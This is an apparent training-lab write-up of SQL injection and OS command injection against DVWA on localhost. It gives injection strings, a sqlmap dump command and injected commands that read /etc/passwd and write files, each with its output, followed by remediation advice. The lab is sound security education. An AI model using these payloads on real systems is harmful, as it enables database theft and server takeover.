# üìò Day 4 ‚Äì Web Application Penetration Testing: SQL Injection & Command Injection

**Target:**

- Application: DVWA (Damn Vulnerable Web App)
- Security Level: Low
- Environment: Docker, localhost

---

## 1Ô∏è‚É£ SQL Injection (SQLi)

### Concept

SQL Injection occurs when user input is inserted directly into SQL queries without proper sanitization, allowing attackers to bypass authentication, extract data, or manipulate the database.

**Example vulnerable query:**

```sql
SELECT first_name, last_name FROM users WHERE id = '$id';

```

**Malicious input:**

```
1' OR '1'='1

```

> This turns the query into always-true, returning all users.
> 

**Impact:**

- Full database disclosure
- Credential theft
- Potential authentication bypass

### Steps & Evidence

**Basic Injection Test**

```
Input: 1' OR '1'='1
Output:
ID: 1' OR '1'='1
First name: admin  Surname: admin
First name: Gordon Surname: Brown
First name: Hack   Surname: Me
First name: Pablo  Surname: Picasso
First name: Bob    Surname: Smith

```

**Database Enumeration**

```
Input: 1' UNION SELECT null, database() --
Output:
Surname: dvwa

Input: 1' UNION SELECT null, schema_name FROM information_schema.schemata --
Output:
Surname: dvwa
Surname: information_schema

```

**Automated Dump with sqlmap**

```bash
sqlmap -u "<http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit>" \\
--cookie="PHPSESSID=SANITIZED; security=low" \\
--dump -D dvwa -T users

```

**Resulting table (sanitized):**

| user_id | user | password (MD5) |
| --- | --- | --- |
| 1 | admin | [HASH] |
| 2 | gordonb | [HASH] |
| 3 | 1337 | [HASH] |
| 4 | pablo | [HASH] |
| 5 | smithy | [HASH] |

> Note: Plaintext passwords removed for public documentation.
> 

---

## 2Ô∏è‚É£ Command Injection (OS Command Execution)

### Concept

Command Injection occurs when user input is passed unsafely to system commands. Attackers can append OS commands using separators (`;`, `&&`, `|`) to execute arbitrary commands.

**Example vulnerable code:**

```php
system("ping -c 4 " . $_GET['ip']);

```

**Malicious input:**

```
127.0.0.1; whoami

```

**Impact:**

- Remote Code Execution (RCE)
- Access to sensitive system files
- File creation/modification
- Potential server takeover

### Steps & Evidence

**Verify Command Execution**

```
Input: 127.0.0.1; whoami
Output: www-data

```

**System Enumeration**

```
Input: 127.0.0.1; id
Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

**File System Inspection**

```
Input: 127.0.0.1; ls -la
Output:
drwxr-xr-x 1 www-data www-data 4096 help
drwxr-xr-x 1 www-data www-data 4096 source
-rw-r--r-- 1 www-data www-data 1830 index.php

```

**Current Working Directory**

```
Input: 127.0.0.1; pwd
Output: /var/www/html/vulnerabilities/exec

```

**Sensitive File Access**

```
Input: 127.0.0.1; cat /etc/passwd
Output:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
...

```

**File Creation Test**

```
Input: 127.0.0.1; echo hacked > /tmp/test.txt
Output: (File /tmp/test.txt created)

```

---

## 3Ô∏è‚É£ Risk Assessment

| Vulnerability | Severity | Impact |
| --- | --- | --- |
| SQL Injection | High | DB dump, credential theft, auth bypass |
| Command Injection | Critical | RCE, server takeover, file system access |

---

## 4Ô∏è‚É£ Recommendations

**SQL Injection:**

- Use prepared statements / parameterized queries
- Validate & sanitize all inputs
- Use least-privilege DB accounts
- Use strong password hashing algorithms

**Command Injection:**

- Never pass raw user input to system commands
- Use input allowlists (e.g., IP regex for ping)
- Run apps with minimal privileges
- Monitor and log system command execution

---

## 5Ô∏è‚É£ Conclusion

- Successfully demonstrated SQLi to extract database records and verify login credentials.
- Successfully demonstrated Command Injection to execute arbitrary commands, read sensitive files, and write to the filesystem.
- Both vulnerabilities represent critical risks that would allow a real attacker to compromise the application and host system.